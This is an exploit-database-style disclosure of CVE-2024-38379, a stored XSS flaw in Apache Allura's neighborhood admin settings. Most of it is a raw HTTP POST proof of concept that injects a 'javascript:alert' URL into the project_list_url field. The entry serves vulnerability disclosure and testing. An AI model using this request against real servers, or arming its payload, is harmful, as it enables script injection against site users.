# Exploit Title: CVE-2024-38379 Apache Allura Stored authenticated XSS

# Exploit Author: [Ömer Akincir](https://www.linkedin.com/in/omerakincir/)

# Team: [Mert Özkan](https://www.linkedin.com/in/mrtozkn/)

# CVE-ID: CVE-2024-38379

# Version: 1.4.0 ~ 1.17.0

# Vuln Details: Stored XSS  

# CVSSv3: 6.9 (Medium)
  - CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:N

# Description: 

  Apache Allura's neighborhood settings are vulnerable to a Stored XSS attack. Only neighborhood admins can access these settings, so the scope of risk is limited to configurations where neighborhood admins are not fully trusted.
    
# Impact: 
  
  An attacker can trigger Stored XSS using this Proof Of Concept.
  
# PoC:  
```
POST /adobe/_admin/update HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------4577509424871948941587615304
Content-Length: 1498
Origin: 
Connection: close
Referer: http://ip/adobe/_admin/overview
Cookie: 
Upgrade-Insecure-Requests: 1

-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="name"

Adobe
-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="redirect"


-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="show_title"

on
-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="css"


-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="project_template"


-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="icon"; filename=""
Content-Type: application/octet-stream


-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="tracking_id"


-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="project_list_url"

javascript:alert("Ömer 'WASP' Akincir")
-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="anchored_tools"


-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="prohibited_tools"


-----------------------------4577509424871948941587615304
Content-Disposition: form-data; name="_session_id"

de6e814d01c354af60dc5919e5cfb8fce5aa6cb307999e49507d4ddcb38c75c884a6be46001ddd71
-----------------------------4577509424871948941587615304--
```

# References:
  - [Apache.org](https://allura.apache.org/posts/2024-allura-1.17.1.html)
  - [CVE.org](https://www.cve.org/CVERecord?id=CVE-2024-38379)
